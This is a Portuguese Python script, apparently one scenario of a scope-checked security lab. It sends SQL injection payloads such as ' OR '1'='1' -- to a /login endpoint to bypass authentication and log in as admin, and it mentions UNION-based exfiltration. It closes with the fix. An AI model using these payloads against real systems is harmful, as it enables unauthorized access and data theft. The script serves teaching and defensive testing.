"""
CENÁRIO 01 · SQL Injection — bypass de login e exfiltração de dados
Camada de aplicação · CIA: quebra de Confidencialidade e de Autenticação.

Ideia: o /login monta a query concatenando texto. Uma entrada com aspas e um
comentário SQL (--) encerra a string e torna o WHERE sempre verdadeiro, logando
sem senha. Com UNION dá para trazer colunas de outra tabela.
"""
from config import checar_escopo, titulo, sessao

ALVO = checar_escopo()


def tentar(usuario, senha, rotulo):
    r = sessao.post(f"{ALVO}/login", data={"usuario": usuario, "senha": senha})
    try:
        j = r.json()
    except Exception:
        j = {"status": r.status_code, "corpo": r.text[:120]}
    print(f"  [{rotulo}] HTTP {r.status_code} -> {j}")
    return r


def main():
    titulo("01", "SQL Injection no login", "Aplicação / Confidencialidade")

    print("\n(1) Login honesto com senha errada — deve falhar:")
    tentar("ana", "senha_errada", "controle")

    print("\n(2) Payload de bypass no campo usuário:  ' OR '1'='1' --")
    # Fecha a aspa de 'usuario', injeta OR sempre-verdadeiro e comenta o resto.
    tentar("' OR '1'='1' -- ", "qualquer", "bypass")

    print("\n(3) Forçando entrar como admin:  ' OR papel='admin' -- ")
    tentar("' OR papel='admin' -- ", "x", "admin")

    print("\nObservação: o servidor ainda devolve a query no erro de SQL (VULN-07),")
    print("o que facilita o atacante a montar o UNION de exfiltração.")
    print("\nCORREÇÃO: query parametrizada (placeholders ?), senhas com hash forte,")
    print("          e mensagens de erro genéricas.")


if __name__ == "__main__":
    main()
